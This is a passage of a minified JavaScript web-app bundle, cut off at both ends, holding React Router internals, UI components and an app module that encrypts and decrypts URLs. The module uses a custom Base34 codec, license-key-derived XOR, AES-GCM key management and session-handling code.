rd(t,e,r,n){return"Cannot include a '"+t+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(n)+"].  Please separate it out to the ")+("`to."+r+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function U2(t){return t.filter((e,r)=>r===0||e.route.path&&e.route.path.length>0)}function D2(t,e){let r=U2(t);return e?r.map((n,s)=>s===r.length-1?n.pathname:n.pathnameBase):r.map(n=>n.pathnameBase)}function z2(t,e,r,n){n===void 0&&(n=!1);let s;typeof t=="string"?s=Ra(t):(s=$i({},t),We(!s.pathname||!s.pathname.includes("?"),rd("?","pathname","search",s)),We(!s.pathname||!s.pathname.includes("#"),rd("#","pathname","hash",s)),We(!s.search||!s.search.includes("#"),rd("#","search","hash",s)));let i=t===""||s.pathname==="",o=i?"/":s.pathname,l;if(o==null)l=r;else{let h=e.length-1;if(!n&&o.startsWith("..")){let f=o.split("/");for(;f[0]==="..";)f.shift(),h-=1;s.pathname=f.join("/")}l=h>=0?e[h]:"/"}let c=O2(s,l),d=o&&o!=="/"&&o.endsWith("/"),u=(i||o===".")&&r.endsWith("/");return!c.pathname.endsWith("/")&&(d||u)&&(c.pathname+="/"),c}const fs=t=>t.join("/").replace(/\/\/+/g,"/"),F2=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),B2=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,V2=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function H2(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}const ev=["post","put","patch","delete"];new Set(ev);const G2=["get",...ev];new Set(G2);/**
 * React Router v6.27.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ui(){return Ui=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var r=arguments[e];for(var n in r)Object.prototype.hasOwnProperty.call(r,n)&&(t[n]=r[n])}return t},Ui.apply(this,arguments)}const df=p.createContext(null),W2=p.createContext(null),oc=p.createContext(null),lc=p.createContext(null),Ia=p.createContext({outlet:null,matches:[],isDataRoute:!1}),tv=p.createContext(null);function cc(){return p.useContext(lc)!=null}function uf(){return cc()||We(!1),p.useContext(lc).location}function rv(t){p.useContext(oc).static||p.useLayoutEffect(t)}function nv(){let{isDataRoute:t}=p.useContext(Ia);return t?ak():K2()}function K2(){cc()||We(!1);let t=p.useContext(df),{basename:e,future:r,navigator:n}=p.useContext(oc),{matches:s}=p.useContext(Ia),{pathname:i}=uf(),o=JSON.stringify(D2(s,r.v7_relativeSplatPath)),l=p.useRef(!1);return rv(()=>{l.current=!0}),p.useCallback(function(d,u){if(u===void 0&&(u={}),!l.current)return;if(typeof d=="number"){n.go(d);return}let h=z2(d,JSON.parse(o),i,u.relative==="path");t==null&&e!=="/"&&(h.pathname=h.pathname==="/"?e:fs([e,h.pathname])),(u.replace?n.replace:n.push)(h,u.state,u)},[e,n,o,i,t])}function q2(t,e){return Q2(t,e)}function Q2(t,e,r,n){cc()||We(!1);let{navigator:s}=p.useContext(oc),{matches:i}=p.useContext(Ia),o=i[i.length-1],l=o?o.params:{};o&&o.pathname;let c=o?o.pathnameBase:"/";o&&o.route;let d=uf(),u;if(e){var h;let w=typeof e=="string"?Ra(e):e;c==="/"||(h=w.pathname)!=null&&h.startsWith(c)||We(!1),u=w}else u=d;let f=u.pathname||"/",m=f;if(c!=="/"){let w=c.replace(/^\//,"").split("/");m="/"+f.replace(/^\//,"").split("/").slice(w.length).join("/")}let g=j2(t,{pathname:m}),v=ek(g&&g.map(w=>Object.assign({},w,{params:Object.assign({},l,w.params),pathname:fs([c,s.encodeLocation?s.encodeLocation(w.pathname).pathname:w.pathname]),pathnameBase:w.pathnameBase==="/"?c:fs([c,s.encodeLocation?s.encodeLocation(w.pathnameBase).pathname:w.pathnameBase])})),i,r,n);return e&&v?p.createElement(lc.Provider,{value:{location:Ui({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:hn.Pop}},v):v}function Y2(){let t=sk(),e=H2(t)?t.status+" "+t.statusText:t instanceof Error?t.message:JSON.stringify(t),r=t instanceof Error?t.stack:null,s={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return p.createElement(p.Fragment,null,p.createElement("h2",null,"Unexpected Application Error!"),p.createElement("h3",{style:{fontStyle:"italic"}},e),r?p.createElement("pre",{style:s},r):null,null)}const J2=p.createElement(Y2,null);class X2 extends p.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,r){return r.location!==e.location||r.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:r.error,location:r.location,revalidation:e.revalidation||r.revalidation}}componentDidCatch(e,r){console.error("React Router caught the following error during render",e,r)}render(){return this.state.error!==void 0?p.createElement(Ia.Provider,{value:this.props.routeContext},p.createElement(tv.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function Z2(t){let{routeContext:e,match:r,children:n}=t,s=p.useContext(df);return s&&s.static&&s.staticContext&&(r.route.errorElement||r.route.ErrorBoundary)&&(s.staticContext._deepestRenderedBoundaryId=r.route.id),p.createElement(Ia.Provider,{value:e},n)}function ek(t,e,r,n){var s;if(e===void 0&&(e=[]),r===void 0&&(r=null),n===void 0&&(n=null),t==null){var i;if(!r)return null;if(r.errors)t=r.matches;else if((i=n)!=null&&i.v7_partialHydration&&e.length===0&&!r.initialized&&r.matches.length>0)t=r.matches;else return null}let o=t,l=(s=r)==null?void 0:s.errors;if(l!=null){let u=o.findIndex(h=>h.route.id&&(l==null?void 0:l[h.route.id])!==void 0);u>=0||We(!1),o=o.slice(0,Math.min(o.length,u+1))}let c=!1,d=-1;if(r&&n&&n.v7_partialHydration)for(let u=0;u<o.length;u++){let h=o[u];if((h.route.HydrateFallback||h.route.hydrateFallbackElement)&&(d=u),h.route.id){let{loaderData:f,errors:m}=r,g=h.route.loader&&f[h.route.id]===void 0&&(!m||m[h.route.id]===void 0);if(h.route.lazy||g){c=!0,d>=0?o=o.slice(0,d+1):o=[o[0]];break}}}return o.reduceRight((u,h,f)=>{let m,g=!1,v=null,w=null;r&&(m=l&&h.route.id?l[h.route.id]:void 0,v=h.route.errorElement||J2,c&&(d<0&&f===0?(g=!0,w=null):d===f&&(g=!0,w=h.route.hydrateFallbackElement||null)));let y=e.concat(o.slice(0,f+1)),x=()=>{let b;return m?b=v:g?b=w:h.route.Component?b=p.createElement(h.route.Component,null):h.route.element?b=h.route.element:b=u,p.createElement(Z2,{match:h,routeContext:{outlet:u,matches:y,isDataRoute:r!=null},children:b})};return r&&(h.route.ErrorBoundary||h.route.errorElement||f===0)?p.createElement(X2,{location:r.location,revalidation:r.revalidation,component:v,error:m,children:x(),routeContext:{outlet:null,matches:y,isDataRoute:!0}}):x()},null)}var sv=function(t){return t.UseBlocker="useBlocker",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t}(sv||{}),El=function(t){return t.UseBlocker="useBlocker",t.UseLoaderData="useLoaderData",t.UseActionData="useActionData",t.UseRouteError="useRouteError",t.UseNavigation="useNavigation",t.UseRouteLoaderData="useRouteLoaderData",t.UseMatches="useMatches",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t.UseRouteId="useRouteId",t}(El||{});function tk(t){let e=p.useContext(df);return e||We(!1),e}function rk(t){let e=p.useContext(W2);return e||We(!1),e}function nk(t){let e=p.useContext(Ia);return e||We(!1),e}function av(t){let e=nk(),r=e.matches[e.matches.length-1];return r.route.id||We(!1),r.route.id}function sk(){var t;let e=p.useContext(tv),r=rk(El.UseRouteError),n=av(El.UseRouteError);return e!==void 0?e:(t=r.errors)==null?void 0:t[n]}function ak(){let{router:t}=tk(sv.UseNavigateStable),e=av(El.UseNavigateStable),r=p.useRef(!1);return rv(()=>{r.current=!0}),p.useCallback(function(s,i){i===void 0&&(i={}),r.current&&(typeof s=="number"?t.navigate(s):t.navigate(s,Ui({fromRouteId:e},i)))},[t,e])}function Is(t){We(!1)}function ik(t){let{basename:e="/",children:r=null,location:n,navigationType:s=hn.Pop,navigator:i,static:o=!1,future:l}=t;cc()&&We(!1);let c=e.replace(/^\/*/,"/"),d=p.useMemo(()=>({basename:c,navigator:i,static:o,future:Ui({v7_relativeSplatPath:!1},l)}),[c,l,i,o]);typeof n=="string"&&(n=Ra(n));let{pathname:u="/",search:h="",hash:f="",state:m=null,key:g="default"}=n,v=p.useMemo(()=>{let w=Zy(u,c);return w==null?null:{location:{pathname:w,search:h,hash:f,state:m,key:g},navigationType:s}},[c,u,h,f,m,g,s]);return v==null?null:p.createElement(oc.Provider,{value:d},p.createElement(lc.Provider,{children:r,value:v}))}function ok(t){let{children:e,location:r}=t;return q2(vu(e),r)}new Promise(()=>{});function vu(t,e){e===void 0&&(e=[]);let r=[];return p.Children.forEach(t,(n,s)=>{if(!p.isValidElement(n))return;let i=[...e,s];if(n.type===p.Fragment){r.push.apply(r,vu(n.props.children,i));return}n.type!==Is&&We(!1),!n.props.index||!n.props.children||We(!1);let o={id:n.props.id||i.join("-"),caseSensitive:n.props.caseSensitive,element:n.props.element,Component:n.props.Component,index:n.props.index,path:n.props.path,loader:n.props.loader,action:n.props.action,errorElement:n.props.errorElement,ErrorBoundary:n.props.ErrorBoundary,hasErrorBoundary:n.props.ErrorBoundary!=null||n.props.errorElement!=null,shouldRevalidate:n.props.shouldRevalidate,handle:n.props.handle,lazy:n.props.lazy};n.props.children&&(o.children=vu(n.props.children,i)),r.push(o)}),r}/**
 * React Router DOM v6.27.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */const lk="6";try{window.__reactRouterVersion=lk}catch{}const ck="startTransition",x0=gp[ck];function dk(t){let{basename:e,children:r,future:n,window:s}=t,i=p.useRef();i.current==null&&(i.current=v2({window:s,v5Compat:!0}));let o=i.current,[l,c]=p.useState({action:o.action,location:o.location}),{v7_startTransition:d}=n||{},u=p.useCallback(h=>{d&&x0?x0(()=>c(h)):c(h)},[c,d]);return p.useLayoutEffect(()=>o.listen(u),[o,u]),p.createElement(ik,{basename:e,children:r,location:l.location,navigationType:l.action,navigator:o,future:n})}var y0;(function(t){t.UseScrollRestoration="useScrollRestoration",t.UseSubmit="useSubmit",t.UseSubmitFetcher="useSubmitFetcher",t.UseFetcher="useFetcher",t.useViewTransitionState="useViewTransitionState"})(y0||(y0={}));var v0;(function(t){t.UseFetcher="useFetcher",t.UseFetchers="useFetchers",t.UseScrollRestoration="useScrollRestoration"})(v0||(v0={}));const Ze=p.forwardRef(({className:t,type:e,...r},n)=>a.jsx("input",{type:e,className:we("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm",t),ref:n,...r}));Ze.displayName="Input";const uk=Yi("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),W=p.forwardRef(({className:t,variant:e,size:r,asChild:n=!1,...s},i)=>{const o=n?Ci:"button";return a.jsx(o,{className:we(uk({variant:e,size:r,className:t})),ref:i,...s})});W.displayName="Button";const hk=Yi("inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2",{variants:{variant:{default:"border-transparent bg-primary text-primary-foreground hover:bg-primary/80",secondary:"border-transparent bg-secondary text-secondary-foreground hover:bg-secondary/80",destructive:"border-transparent bg-destructive text-destructive-foreground hover:bg-destructive/80",outline:"text-foreground"}},defaultVariants:{variant:"default"}});function Se({className:t,variant:e,...r}){return a.jsx("div",{className:we(hk({variant:e}),t),...r})}const fk=({timestamp:t,rotationCounter:e,encryptionMode:r,patternName:n,encryptedPreview:s,varietySeed:i,securityLevel:o=85})=>{const l=u=>{const h=new Date(u);return h.toLocaleTimeString("en-US",{hour12:!1,hour:"2-digit",minute:"2-digit",second:"2-digit"})+"."+h.getMilliseconds().toString().padStart(3,"0")},c=u=>{switch(u){case"aes":return"bg-emerald-500/10 text-emerald-700 border-emerald-200";case"xor":return"bg-blue-500/10 text-blue-700 border-blue-200";case"hybrid":return"bg-purple-500/10 text-purple-700 border-purple-200";default:return"bg-gray-500/10 text-gray-700 border-gray-200"}},d=u=>!u||u.length<16?u:`${u.slice(0,8)}...${u.slice(-8)}`;return a.jsxs("div",{className:"bg-gradient-to-r from-slate-50 to-slate-100 border border-slate-200 rounded-lg p-4 space-y-3",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-3",children:[a.jsx(Ge,{className:"h-4 w-4 text-blue-600"}),a.jsx("span",{className:"text-sm font-semibold text-slate-700",children:"Generation Metadata"})]}),a.jsxs("div",{className:"grid grid-cols-2 md:grid-cols-3 gap-3 text-xs",children:[a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(cr,{className:"h-3 w-3 text-slate-500"}),a.jsxs("div",{children:[a.jsx("div",{className:"text-slate-500",children:"Generated"}),a.jsx("div",{className:"font-mono text-slate-700",children:l(t)})]})]}),a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(ty,{className:"h-3 w-3 text-slate-500"}),a.jsxs("div",{children:[a.jsx("div",{className:"text-slate-500",children:"Rotation"}),a.jsxs("div",{className:"font-mono text-slate-700",children:["#",e]})]})]}),a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(lt,{className:"h-3 w-3 text-slate-500"}),a.jsxs("div",{children:[a.jsx("div",{className:"text-slate-500",children:"Encryption"}),a.jsx(Se,{variant:"outline",className:`text-xs px-2 py-0.5 ${c(r)}`,children:r.toUpperCase()})]})]}),n&&a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(Bt,{className:"h-3 w-3 text-slate-500"}),a.jsxs("div",{children:[a.jsx("div",{className:"text-slate-500",children:"Pattern"}),a.jsx("div",{className:"font-medium text-slate-700 truncate",children:n})]})]}),s&&a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(Hj,{className:"h-3 w-3 text-slate-500"}),a.jsxs("div",{children:[a.jsx("div",{className:"text-slate-500",children:"Encrypted"}),a.jsx("div",{className:"font-mono text-xs text-slate-600 bg-slate-100 px-2 py-1 rounded",children:d(s)})]})]}),i&&a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(Ge,{className:"h-3 w-3 text-slate-500"}),a.jsxs("div",{children:[a.jsx("div",{className:"text-slate-500",children:"Variety"}),a.jsx("div",{className:"font-mono text-slate-700",children:i%1e4})]})]})]}),a.jsxs("div",{className:"pt-2 border-t border-slate-200",children:[a.jsxs("div",{className:"flex items-center justify-between text-xs mb-1",children:[a.jsx("span",{className:"text-slate-500",children:"Security Level"}),a.jsxs("span",{className:"text-slate-700 font-semibold",children:[o,"%"]})]}),a.jsx("div",{className:"w-full bg-slate-200 rounded-full h-2",children:a.jsx("div",{className:"bg-gradient-to-r from-emerald-500 to-blue-500 h-2 rounded-full transition-all duration-500",style:{width:`${o}%`}})})]})]})},mk="modulepreload",pk=function(t){return"/"+t},b0={},Vt=function(e,r,n){let s=Promise.resolve();if(r&&r.length>0){document.getElementsByTagName("link");const o=document.querySelector("meta[property=csp-nonce]"),l=(o==null?void 0:o.nonce)||(o==null?void 0:o.getAttribute("nonce"));s=Promise.allSettled(r.map(c=>{if(c=pk(c),c in b0)return;b0[c]=!0;const d=c.endsWith(".css"),u=d?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${c}"]${u}`))return;const h=document.createElement("link");if(h.rel=d?"stylesheet":mk,d||(h.as="script"),h.crossOrigin="",h.href=c,l&&h.setAttribute("nonce",l),document.head.appendChild(h),d)return new Promise((f,m)=>{h.addEventListener("load",f),h.addEventListener("error",()=>m(new Error(`Unable to preload CSS for ${c}`)))})}))}function i(o){const l=new Event("vite:preloadError",{cancelable:!0});if(l.payload=o,window.dispatchEvent(l),!l.defaultPrevented)throw o}return s.then(o=>{for(const l of o||[])l.status==="rejected"&&i(l.reason);return e().catch(i)})},Di="23456789abcdefghijkmnpqrstuvwxyz",bu=Di.length,iv="9";function wu(t){if(!t)return"";const e=new TextEncoder().encode(t);let r=0n;for(let i=0;i<e.length;i++)r=r*256n+BigInt(e[i]);if(r===0n)return Di[0];let n="";for(;r>0n;)n=Di[Number(r%BigInt(bu))]+n,r=r/BigInt(bu);const s=Math.ceil(n.length/4)*4;for(;n.length<s;)n+=iv;return n}function Cl(t){if(!t)return"";const e=t.replace(new RegExp(`${iv}+$`),"");let r=0n;for(let s=0;s<e.length;s++){const i=Di.indexOf(e[s]);if(i===-1)throw new Error(`Invalid Base34 character: ${e[s]}`);r=r*BigInt(bu)+BigInt(i)}if(r===0n)return"";const n=[];for(;r>0n;)n.unshift(Number(r%256n)),r=r/256n;return new TextDecoder().decode(new Uint8Array(n))}function ju(t){if(!t||t.length<4)return!1;for(const e of t)if(!Di.includes(e))return!1;return!0}const gk=async t=>{const r=new TextEncoder().encode(t),n=await crypto.subtle.digest("SHA-256",r);return Array.from(new Uint8Array(n)).map(i=>i.toString(16).padStart(2,"0")).join("")},ov=async t=>{if(!t||t.length<8)throw new Error("License key required for deterministic key generation");const e=`${t}:phantom-deterministic:v2`,r=await gk(e);let n="";for(let s=0;s<32;s++){const i=r.substr(s*2,2),o=parseInt(i,16),l=String.fromCharCode(33+o%94);n+=l}return n},xk=t=>wu(t),yk=t=>Cl(t),Gn=async(t,e)=>{if(!t||typeof t!="string")throw new Error("Invalid input for XOR encryption");if(!e||e.length<8)throw new Error("Valid license key required for secure encryption");try{const r=await ov(e);let n="";for(let i=0;i<t.length;i++){const o=t.charCodeAt(i)^r.charCodeAt(i%r.length);n+=String.fromCharCode(o)}return xk(n)}catch(r){throw new Error(`XOR encryption failed: ${r instanceof Error?r.message:"Unknown error"}`)}},Tl=async(t,e)=>{if(!t||typeof t!="string")throw new Error("Invalid encrypted text for XOR decryption");if(!e||e.length<8)throw new Error("Valid license key required for decryption");try{const r=await ov(e);if(ju(t)){const n=yk(t);let s="";for(let i=0;i<n.length;i++){const o=n.charCodeAt(i)^r.charCodeAt(i%r.length);s+=String.fromCharCode(o)}if(vk(s))return s}throw new Error("Invalid encrypted data format or corrupted data")}catch(r){throw new Error(`XOR decryption failed: ${r instanceof Error?r.message:"Unknown error"}`)}},vk=t=>!t||t.length<4?!1:t.includes("http")||t.includes("://")||t.includes("www.")||t.includes(".")&&t.length>8&&/\.(com|org|net|edu|gov|io|co|app|ca|uk|de|fr|ly|me|ai|xyz)/.test(t),qn=class qn{constructor(){re(this,"keyCache",new Map);re(this,"masterKeyCache",null)}static getInstance(){return qn.instance||(qn.instance=new qn),qn.instance}generateSalt(){return crypto.getRandomValues(new Uint8Array(16))}generateNonce(){return crypto.getRandomValues(new Uint8Array(12))}getDayKey(){const e=new Date;return`${e.getFullYear()}-${e.getMonth()}-${e.getDate()}`}async deriveMasterKey(e,r){const n=new TextEncoder,s=await crypto.subtle.importKey("raw",n.encode(e),{name:"PBKDF2"},!1,["deriveBits","deriveKey"]);return crypto.subtle.deriveKey({name:"PBKDF2",salt:r,iterations:1e5,hash:"SHA-256"},s,{name:"AES-GCM",length:256},!0,["encrypt","decrypt"])}async deriveTimeBasedKey(e,r){const n=new TextEncoder,s=this.getDayKey(),i=n.encode(`${r}-${s}`),o=await crypto.subtle.exportKey("raw",e),l=await crypto.subtle.importKey("raw",o,{name:"HKDF"},!1,["deriveKey"]);return crypto.subtle.deriveKey({name:"HKDF",hash:"SHA-256",salt:new Uint8Array(32),info:i},l,{name:"AES-GCM",length:256},!1,["encrypt","decrypt"])}async getEncryptionKey(e,r="default"){const n=`${e}-${r}-${this.getDayKey()}`;if(this.keyCache.has(n))return this.keyCache.get(n);const s=this.generateSalt(),i=await this.deriveMasterKey(e,s),o=await this.deriveTimeBasedKey(i,r);return this.keyCache.set(n,o),setTimeout(()=>{this.keyCache.delete(n)},48*60*60*1e3),o}clearOldKeys(){this.keyCache.clear(),this.masterKeyCache=null}};re(qn,"instance");let _u=qn;class bk{constructor(){re(this,"keyManager",_u.getInstance())}toBase34(e){const r=new Uint8Array(e),n=String.fromCharCode(...r);return wu(n)}fromBase34(e){try{const r=Cl(e),n=new Uint8Array(r.length);for(let s=0;s<r.length;s++)n[s]=r.charCodeAt(s);return n.buffer}catch(r){throw new Error(`Failed to decode Base34: ${r.message}`)}}toBase64Url(e){return btoa(String.fromCharCode(...new Uint8Array(e))).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}fromBase64Url(e){const r=e.replace(/-/g,"+").replace(/_/g,"/"),n="=".repeat((4-r.length%4)%4),s=atob(r+n),i=new Uint8Array(s.length);for(let o=0;o<s.length;o++)i[o]=s.charCodeAt(o);return i.buffer}async encrypt(e,r,n="url"){try{const i=new TextEncoder().encode(e),o=await this.keyManager.getEncryptionKey(r,n),l=crypto.getRandomValues(new Uint8Array(12)),c=crypto.getRandomValues(new Uint8Array(16)),d=await crypto.subtle.encrypt({name:"AES-GCM",iv:l,additionalData:c},o,i),u={ciphertext:this.toBase34(d.slice(0,-16)),nonce:this.toBase34(l),salt:this.toBase34(c),timestamp:Date.now(),authTag:this.toBase34(d.slice(-16))},h=JSON.stringify(u);return wu(h)}catch(s){throw new Error(`AES encryption failed: ${s instanceof Error?s.message:"Unknown error"}`)}}async decrypt(e,r,n="url"){try{try{const s=Cl(e),i=JSON.parse(s),{ciphertext:o,nonce:l,salt:c,timestamp:d,authTag:u}=i,h=this.fromBase34(o),f=new Uint8Array(this.fromBase34(l)),m=new Uint8Array(this.fromBase34(c)),g=new Uint8Array(this.fromBase34(u)),v=7*24*60*60*1e3;if(Date.now()-d>v)return{plaintext:"",success:!1,error:"Encrypted data has expired"};const w=new Uint8Array(h.byteLength+g.length);w.set(new Uint8Array(h)),w.set(g,h.byteLength);let y=await this.keyManager.getEncryptionKey(r,n);try{const x=await crypto.subtle.decrypt({name:"AES-GCM",iv:f,additionalData:m},y,w);return{plaintext:new TextDecoder().decode(x),success:!0}}catch(x){const b=`${n}-prev`;try{const j=await this.keyManager.getEncryptionKey(r,b),_=await crypto.subtle.decrypt({name:"AES-GCM",iv:f,additionalData:m},j,w);return{plaintext:new TextDecoder().decode(_),success:!0}}catch{return{plaintext:"",success:!1,error:`Base34 decryption failed: ${x instanceof Error?x.message:"Authentication failed"}`}}}}catch(s){console.warn("Base34 decryption failed, trying legacy formats:",s);let i=e.split(".");if(i.length!==5)try{const b=this.fromBase64Url(e);i=new TextDecoder().decode(b).split(".")}catch{return{plaintext:"",success:!1,error:"Invalid encrypted data format - cannot decode"}}if(i.length!==5)return{plaintext:"",success:!1,error:"Invalid encrypted data format"};const[o,l,c,d,u]=i,h=this.fromBase64Url(o),f=new Uint8Array(this.fromBase64Url(l)),m=new Uint8Array(this.fromBase64Url(c)),g=parseInt(d),v=new Uint8Array(this.fromBase64Url(u)),w=7*24*60*60*1e3;if(Date.now()-g>w)return{plaintext:"",success:!1,error:"Encrypted data has expired"};const y=new Uint8Array(h.byteLength+v.length);y.set(new Uint8Array(h)),y.set(v,h.byteLength);let x=await this.keyManager.getEncryptionKey(r,n);try{const b=await crypto.subtle.decrypt({name:"AES-GCM",iv:f,additionalData:m},x,y);return{plaintext:new TextDecoder().decode(b),success:!0}}catch(b){const j=`${n}-prev`;try{const _=await this.keyManager.getEncryptionKey(r,j),N=await crypto.subtle.decrypt({name:"AES-GCM",iv:f,additionalData:m},_,y);return{plaintext:new TextDecoder().decode(N),success:!0}}catch{return{plaintext:"",success:!1,error:`Legacy decryption failed: ${b instanceof Error?b.message:"Authentication failed"}`}}}}}catch(s){return{plaintext:"",success:!1,error:`AES decryption failed: ${s instanceof Error?s.message:"Unknown error"}`}}}generateSecureKey(e=32){const r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=crypto.getRandomValues(new Uint8Array(e));return Array.from(n,s=>r[s%r.length]).join("")}cleanup(){this.keyManager.clearOldKeys()}}const w0=new bk;class wk{constructor(e){re(this,"config");re(this,"state");re(this,"secureKeys",new Map);re(this,"sessionTimer",null);re(this,"keyRotationTimer",null);this.config={sessionTimeout:24*60*60*1e3,keyRotationInterval:60*60*1e3,enableAutoKeyClearing:!0,enableSecureStorage:!0,...e},this.state={isSecureSession:!1,lastActivityTime:Date.now(),encryptionKeysInMemory:!1,sessionValidUntil:0},this.initializeSecurityMonitoring()}startSecureSession(e,r){const n=new Date(r).getTime();this.state={isSecureSession:!0,lastActivityTime:Date.now(),encryptionKeysInMemory:!1,sessionValidUntil:n},this.config.enableSecureStorage&&this.setSecureItem("session_token",e),this.startSessionMonitoring(),console.log("[SecurityManager] Secure session started, expires:",new Date(n))}endSecureSession(){console.log("[SecurityManager] Ending secure session and clearing sensitive data"),this.clearAllEncryptionKeys(),this.clearSecureStorage(),this.sessionTimer&&(clearTimeout(this.sessionTimer),this.sessionTimer=null),this.keyRotationTimer&&(clearTimeout(this.keyRotationTimer),this.keyRotationTimer=null),this.state={isSecureSession:!1,lastActivityTime:0,encryptionKeysInMemory:!1,sessionValidUntil:0},typeof window<"u"&&window.gc&&window.gc()}storeEncryptionKey(e,r){this.secureKeys.set(e,r),this.state.encryptionKeysInMemory=!0,this.config.enableAutoKeyClearing&&setTimeout(()=>{this.clearEncryptionKey(e)},this.config.keyRotationInterval)}getEncryptionKey(e){return this.updateActivity(),this.secureKeys.get(e)||null}clearEncryptionKey(e){var r;if(this.secureKeys.has(e)){const n=this.generateRandomKey(((r=this.secureKeys.get(e))==null?void 0:r.length)||32);this.secureKeys.set(e,n),this.secureKeys.delete(e)}this.secureKeys.size===0&&(this.state.encryptionKeysInMemory=!1)}clearAllEncryptionKeys(){console.log("[SecurityManager] Clearing all encryption keys from memory");for(const[e,r]of this.secureKeys.entries()){const n=this.generateRandomKey(r.length);this.secureKeys.set(e,n)}this.secureKeys.clear(),this.state.encryptionKeysInMemory=!1}isSessionValid(){const e=Date.now();return this.state.isSecureSession&&e<this.state.sessionValidUntil&&e-this.state.lastActivityTime<this.config.sessionTimeout}updateActivity(){this.state.lastActivityTime=Date.now()}getSecurityState(){return{...this.state}}setSecureItem(e,r){if(this.config.enableSecureStorage)try{sessionStorage.setItem(`secure_${e}`,this.encodeSecureValue(r))}catch(n){console.warn("[SecurityManager] Failed to store secure item:",n)}}getSecureItem(e){if(!this.config.enableSecureStorage)return null;try{const r=sessionStorage.getItem(`secure_${e}`);return r?this.decodeSecureValue(r):null}catch(r){return console.warn("[SecurityManager] Failed to retrieve secure item:",r),null}}clearSecureStorage(){console.log("[SecurityManager] Clearing secure storage");try{for(let e=sessionStorage.length-1;e>=0;e--){const r=sessionStorage.key(e);r!=null&&r.startsWith("secure_")&&sessionStorage.removeItem(r)}}catch(e){console.warn("[SecurityManager] Failed to clear secure storage:",e)}}initializeSecurityMonitoring(){window.addEventListener("beforeunload",()=>{this.endSecureSession()}),document.addEventListener("visibilitychange",()=>{document.hidden&&this.config.enableAutoKeyClearing&&setTimeout(()=>{document.hidden&&this.clearAllEncryptionKeys()},5*60*1e3)})}startSessionMonitoring(){this.sessionTimer=setInterval(()=>{this.isSessionValid()||(console.log("[SecurityManager] Session expired, ending secure session"),this.endSecureSession())},60*1e3),this.config.enableAutoKeyClearing&&(this.keyRotationTimer=setInterval(()=>{console.log("[SecurityManager] Rotating encryption keys"),this.clearAllEncryptionKeys()},this.config.keyRotationInterval))}generateRandomKey(e){let r="";const n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";for(let s=0;s<e;s++)r+=n.charAt(Math.floor(Math.random()*n.length));return r}encodeSecureValue(e){return btoa(encodeURIComponent(e))}decodeSecureValue(e){try{return decodeURIComponent(atob(e))}catch{return console.warn("[SecurityManager] Failed to decode secure value"),""}}}const So=new wk,Wa=(t,e,r="info",n)=>{console.log(`[Security] ${r.toUpperCase()}: ${t} - ${e}`,n)};class jk{constructor(){re(this,"encryptionStats",{aesSuccessRate:.97,xorSuccessRate:.95,totalOperations:0,aesOperations:0,xorOperations:0})}async encryptUrl(e,r,n,s="auto"){try{if(!So.isSessionValid())throw Wa("encryption_attempt","Encryption attempted with invalid session","warning"),new Error("Invalid session for encryption operation");this.encryptionStats.totalOperations++,So.updateActivity();const i=`temp_encrypt_${Date.now()}`;So.storeEncryptionKey(i,r);try{if((s==="auto"?"xor":s)==="aes"&&r&&r.length>=12)try{const c=await w0.encrypt(e,r);if(this.encryptionStats.aesOperations++,c&&c.length>10)return 